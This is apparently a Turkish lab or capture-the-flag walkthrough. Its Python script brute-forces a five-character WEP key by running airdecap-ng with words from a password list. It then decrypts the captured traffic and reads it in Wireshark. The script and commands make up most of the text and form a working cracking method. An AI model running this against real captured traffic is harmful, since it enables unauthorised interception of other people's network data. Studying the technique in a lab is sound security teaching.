Açılan dosyaya aşağıdaki kodu yapıştırıp kaydediyoruz (`CTRL+O`, `Enter`, `CTRL+X`):

```
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Kronometreyi başlat
start_time = time.time()

# Dosya yolları
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Sözlük dosyasını oku
with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
    wordlist = f.readlines()

# Sözlükteki her kelimeyi dene
for ln, word in enumerate(wordlist, start=1):
    # Boşlukları ve özel karakterleri temizle
    key = re.sub(r'\W+', '', word)
    
    # Sadece 5 karakterli kelimeleri filtrele (soru 5 karakterli şifre istiyor)
    if len(key) != 5:
        continue
        
    # WEP anahtarını hexadecimal formata çevir
    hex_key = binascii.hexlify(key.encode('utf-8'))
    
    print(f"{ln}: Deneniyor: {key} Hex: {hex_key}")
    
    # airdecap-ng'yi çalıştır
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")
    
    # Başarılı olup olmadığını kontrol et
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# Şifre bulunamazsa
print("No WEP key found")
```

### 🚀 Adım 3: Betiği Çalıştırma

Kaydettiğimiz betiği terminalde çalıştırarak kırma işlemini başlatıyoruz:

```
python3 bruteforce.py
```

> **Çıktı Örneği:** Betik çalıştığında kelimeleri hızla tarayacak ve doğru şifreyi bulduğunda ekrana yazdıracaktır: `Success! WEP key found: cheek`

## 🔓 Sonuç ve Trafiği Çözme

Şifreyi bulduktan sonra (örneğin `cheek`, hex karşılığı: `636865656b`), elde ettiğimiz bu WEP anahtarını kullanarak ağ trafiğinin tamamını çözebilir ve okunabilir hale getirebiliriz:

```
airdecap-ng -w 636865656b /opt/WEP-01.cap
```

Bu işlem sonucunda `WEP-01-dec.cap` adında yeni bir dosya oluşur. Bu dosyayı **Wireshark** ile açarak ağ içerisindeki tüm verileri (protokoller, veri yükleri vb.) düz metin (plaintext) olarak inceleyebiliriz.